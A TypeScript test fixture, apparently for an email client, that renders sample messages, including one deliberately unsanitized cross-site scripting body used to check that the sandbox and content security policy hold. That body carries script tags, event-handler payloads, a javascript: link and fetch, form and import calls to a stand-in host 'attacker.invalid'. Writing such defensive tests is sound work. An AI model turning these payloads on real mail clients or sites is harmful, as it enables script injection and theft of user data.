import { ME, XSS_INDEX, positionOf, remoteImages, type Message, type Row } from './fixture.ts';

/** The real server's CSPs, generated from the Rust constants. */
export { RENDER_CSP, WEB_APP_CSP } from '../../../packages/api-types/src/generated/csp.ts';

export const ATTACKER = 'http://attacker.invalid';

/** Hostile message body, served unsanitized: only the sandbox and CSP stand in its way. */
const XSS_BODY = `
<p>Hello! Nothing to see here.</p>
<script>window.parent.__pwned = 'script'; fetch('${ATTACKER}/script')</script>
<img src="${ATTACKER}/x.png" onerror="window.parent.__pwned='onerror'" alt="">
<svg onload="window.parent.__pwned='svg'"><circle r="4"/></svg>
<iframe srcdoc="<script>parent.parent.__pwned='srcdoc'</script>"></iframe>
<a id="jslink" href="javascript:window.parent.__pwned='link'">open me</a>
<form action="${ATTACKER}/form"><button id="submit">Submit</button></form>
<object data="${ATTACKER}/x.swf"></object>
<details open ontoggle="window.parent.__pwned='toggle'"><summary>more</summary></details>
<style>@import url('${ATTACKER}/x.css');</style>
<p>Regards,<br>Mallory</p>`;

const PIXEL =
	'data:image/svg+xml;utf8,' +
	encodeURIComponent(
		'<svg xmlns="http://www.w3.org/2000/svg" width="560" height="120"><rect width="560" height="120" rx="10" fill="#e8eefc"/><text x="24" y="68" font-family="sans-serif" font-size="22" fill="#2350c8">Northwind — spring collection</text></svg>'
	);

function escape(s: string): string {
	return s.replace(
		/[&<>"]/g,
		(c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' })[c]!
	);
}

/** The body as the reply helper quotes it: the hostile sample stays hostile. */
export function quotedBody(row: Row, m: Message): string {
	if (positionOf(row.id) === XSS_INDEX) return XSS_BODY;
	return `<p>${escape(m.snippet)}.</p>`;
}

export function renderMessage(row: Row, m: Message, images: boolean): string {
	if (positionOf(row.id) === XSS_INDEX) return page(XSS_BODY);
	const greeting = m.from === ME ? 'Hi,' : `Hi ${ME.name?.split(' ')[0]},`;
	const banner =
		remoteImages(row, m) > 0
			? images
				? `<p><img src="${PIXEL}" alt="Spring collection" width="560" height="120"></p>`
				: `<p class="blocked">[image blocked]</p>`
			: '';
	const body = `
<p>${greeting}</p>
${banner}
<p>${escape(m.snippet)}.</p>
<p>Let me know what you think — happy to jump on a call if that’s easier. I’ve also added the
summary below so you don’t have to dig through the earlier messages.</p>
<ul><li>Scope stays as agreed in March</li><li>Next check-in: Thursday</li></ul>
<blockquote>On an earlier day, someone wrote: sounds good to me.</blockquote>
<p>Best,<br>${escape(m.from?.name ?? m.from?.email ?? '')}</p>`;
	return page(body);
}

function page(body: string): string {
	return `<!doctype html><html><head><meta charset="utf-8"><style>
body{margin:0;padding:4px 2px;font:15px/1.55 -apple-system,'Segoe UI',sans-serif;color:#1d2228;background:#fff}
blockquote{margin:12px 0;padding-left:12px;border-left:3px solid #d5dae1;color:#5b6370}
.blocked{display:inline-block;padding:18px 24px;border:1px dashed #c3cad3;border-radius:8px;color:#7b8490}
a{color:#2350c8}
</style></head><body>${body}</body></html>`;
}
